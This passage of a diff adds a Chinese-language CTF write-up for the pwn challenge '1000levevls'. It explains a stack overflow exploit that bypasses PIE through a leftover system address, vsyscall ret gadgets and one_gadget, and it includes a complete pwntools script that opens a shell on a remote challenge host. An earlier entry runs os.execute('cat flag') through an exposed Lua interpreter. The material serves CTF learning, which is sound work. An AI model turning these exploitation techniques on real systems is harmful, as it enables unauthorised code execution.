@@ -1985,3 +1985,57 @@ if __name__ == '__main__':
 题目：暂无
 
 思路：题目只给了一个nc连接地址，输入后会提示可以输入的命令，其中help命令可以得到一个lua字节码文件，保存这个文件以用unluac_2020_05_28.jar反编译，反编译会报错，跟自己手动编译的一个lua字节码文件比较返现头部少了一个字节，增加这个字节以后可以正常反编译，源代码审计发现这个nc连接是一个lua解释器，直接输入lua的命令就可以获取flag， os.execute('cat flag')
+
+
+### 23. 1000levevls
+题目：暂无
+
+思路：漏洞点为常规的栈溢出，难点在于绕过地址随机化，一是利用了栈上残留的system变量，二是利用了vsyscall地址不随机的缺陷，三是利用one_gadget.
+
+题目的溢出点比较常规，没有开启canary等保护机制，但是开启了PIE，由于地址都是随机的，没法直接ROP。本题存在一个特殊的栈变量，hint函数会将system函数的地址放入到栈中ebp+0x110处，而在go函数中这个位置正好存放一个变量，而且这里存在一个漏洞就是输入的level值小于等于0时，这个变量没有赋初值，默认为system的地址，此外在输入any more的时候这个变量会加上一个值，如果这个值为one_gadget和system函数在libc的偏移，那么这个变量中实际的保存的值将会变为one_gadget在内存中的真实地址！
+
+现在只通过栈溢出将这个值作为返回地址就可以了，但是这个变量的位置在实际返回地址下方24字节，这里可以使用类似nop滑行指令的方式，将溢出函数的返回值指向一个ret指令，这时溢出函数返回时会执行ret，即弹出一个地址，然后继续返回。这个ret指令来自vsyscall段，这个段的地址空间是固定的而不是随机的（某些版本的linux将这个段删除了），因此可以从这里找一个ret指令即可。
+
+one_gadget的安装使用如下：
+```bash
+sudo gem install one_gadget
+one_gadget libc.so
+```
+
+全部利用源代码如下：
+```python
+from pwn import *
+
+debug = False
+if debug:
+    io = process('100levels')
+else:
+    io = remote('220.249.52.134', 52998)
+
+libc = ELF('libc.so')
+system_addr = libc.sym['system']
+exec_gadget = 0x4526a
+offset_address = exec_gadget - system_addr
+vsyscall = 0xffffffffff600000
+
+if __name__ == '__main__':
+    # 先执行hint将system地址放入栈中
+    data = io.sendlineafter('Choice:\n', '2')
+    print(data)
+    data = io.sendlineafter('Choice:\n', '1')
+    print(data)
+    # 输入的level<=0, level变量不会被初始化，而使用了栈上残留的system地址
+    data = io.sendlineafter('?\n', '0')
+    print(data)
+    # any more输入，这个值会加到level变量，此时level变量中保存的是one_gadget实际在内存中的地址
+    data = io.sendlineafter('?\n', str(offset_address))
+    print(data)
+    for _ in range(99):
+        # 这里利用溢出覆盖了下一个变量（程序计算结果）为0，输入的值也为0，因此结果始终正确
+        data = io.sendlineafter('Answer:', p64(0) * 5)
+        print(data)
+    # 覆盖到rbp，然后从返回地址开始覆盖了3个ret指令的地址，执行完3个ret后会跳转到one_gadget
+    data = io.sendafter('Answer:', b'a' * 0x38 + p64(vsyscall) * 3)
+    print(data)
+    io.interactive()
+```
